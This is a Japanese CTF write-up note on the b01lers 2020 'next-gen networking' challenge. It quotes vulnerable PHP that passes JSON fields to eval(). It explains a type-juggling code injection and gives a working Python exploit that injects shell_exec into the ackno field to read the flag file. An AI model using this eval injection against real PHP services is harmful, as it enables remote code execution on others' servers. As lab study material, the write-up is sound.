# 概要

# writeup
##
https://born2scan.github.io/2020/10/05/Bo1lersCTF.html#next-gen-networking  
- **entrypoint**  
以下のソースが与えられる。  
```php
<?php
    function get_data() {
        if(!isset($_POST["packet"])){
            return "<p>Error: packet not found</p>";
        }

        $raw_packet = $_POST["packet"];
        $packet = json_decode($raw_packet);
        if($packet == null) {
            return "<p>Error: decoding packet</p>";
        }

        if($packet->version != 6.5) {
            return "<p>Error: wrong packet version</p>";
        }

        $calculated_ihl = strlen($packet->version) + strlen(strval($packet->len)) + strlen(strval($packet->ttl)) + strlen(strval($packet->seqno)) + strlen(strval($packet->ackno)) + strlen($packet->algo) + 64;
        $calculated_ihl = $calculated_ihl + strlen(strval($calculated_ihl));
        if($packet->ihl != $calculated_ihl or $packet->ihl > 170) {
            return "<p>Error: wrong header size</p>";
        }

        if($packet->len != strlen($raw_packet)) {
            return "<p>Error: mismatched packet size</p>";
        }

        if($packet->ttl - 1 != 0) {
            return "<p>Error: invalid ttl</p>";
        }

        if($packet->ackno != $_COOKIE["seqno"] + 1) {
            return "<p>Error: out of order packet</p>";
        }

        if($packet->algo != "sha256"){
            return "<p>Error: unsupported algorithm</p>";
        }

        $checksum_str = "\$checksum = hash(\"$packet->algo\", strval($packet->ihl + $packet->len + $packet->ttl + $packet->seqno + $packet->ackno));";
        eval($checksum_str);

        if($packet->checksum != $checksum) {
            return "<p>Error: checksums don't match</p>";
        }

        $file_name_hash = hash("md5", microtime());
        $file_name = "sent/".$file_name_hash.".packet";
        $packet_file = fopen($file_name, "w") or die("Unable to open packet file");
        fwrite($packet_file, $packet->data);
        fclose($packet_file);

        return "<h1>Packet data written</h1><div><a href=\"".$file_name."\">".$file_name_hash.".packet</a></div>";
    }
?>

<!DOCTYPE html>
<html>
    <head>
        <title>Send Packet.</title>
        <link rel="stylesheet" href="/style.css"/>
        <link rel="stylesheet" href="/tron.css"/>
    </head>
    <body>
        <div id="main-wrapper">
            <div class="content-page">
                <?php echo get_data(); ?>
            </div>
        </div>
    </body>
</html>
```
以下のevalが使われている部分が脆弱っぽそう。上で`!=`という弱い比較をしているのでType Jugglingできるとわかる。  
```php
        $checksum_str = "\$checksum = hash(\"$packet->algo\", strval($packet->ihl + $packet->len + $packet->ttl + $packet->seqno + $packet->ackno));";
        eval($checksum_str);
```
例えば`$packet->ttl`の`if($packet->ttl - 1 != 0) {`の部分で以下のように再現すると任意コードを実行できる。  
https://sandbox.onlinephpfunctions.com/  
でhash関数が使える5.1.2以降かつ`$ttl-1`の部分でWarningが出ないちょっと低めのバージョンで実行する。  
```php
$ttl = "1 ));echo 'aaaaaaaaa';//";  // 先頭に1と書いてそのあとに数字以外の文字列を書いておけば1と変換される
$algo = "sha256";

if($ttl - 1 != 0) echo "error!"."\n";

$checksum_str = "\$checksum = hash(\"$algo\", strval($ttl));";
echo $checksum_str."\n";

eval($checksum_str);
echo $checksum;

// 出力
// $checksum = hash("sha256", strval(1 ));echo 'aaaaaaaaa';//));
// aaaaaaaaa6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b
```
writeupでは以下のようにて`if($packet->ackno != $_COOKIE["seqno"] + 1) {`の部分にInjectしていた。  
```php
$ackno = "1abc";
if ($ackno == "0abc" + 1) {
    echo "PWNED";
}

$packet->ackno = "1)); /*EXPLOIT_CODE*/ echo((1"
```
- **payload**  
```python
import json

import requests

headers = {
    'Connection': 'keep-alive',
    'Accept': '*/*',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept-Language': 'it-IT,it;q=0.9,fr-IT;q=0.8,fr;q=0.7,en-IT;q=0.6,en;q=0.5,en-US;q=0.4',
}

packet = {
    'version' : 6.5,
    'len' : 258,
    'ttl' : 1,
    'seqno' : 1,
    'ackno' : '1));$packet->data = shell_exec("cat ./sent/flag.packet.php");echo((1',
    'algo' : 'sha256',
    'ihl' : 149,
    'checksum' : '612111a352a571cbed3927ec6f74948849bcc9fe8489bf4f0d6235afdc0a4ad7',
    'data' : 'wow'
}

data = {
  'packet': json.dumps(packet),
}

response = requests.post('http://chal.ctf.b01lers.com:3002/packets/send.php', headers=headers, data=data, cookies={'seqno' : '0as'}, verify=False)
response = response.text
print(response)
```
## 
- **entrypoint**  
- **payload**  
##
- **entrypoint**  
- **payload**  
##
- **entrypoint**  
- **payload**  
##
- **entrypoint**  
- **payload**  

# メモ
https://www.hamayanhamayan.com/entry/2020/08/09/193357  
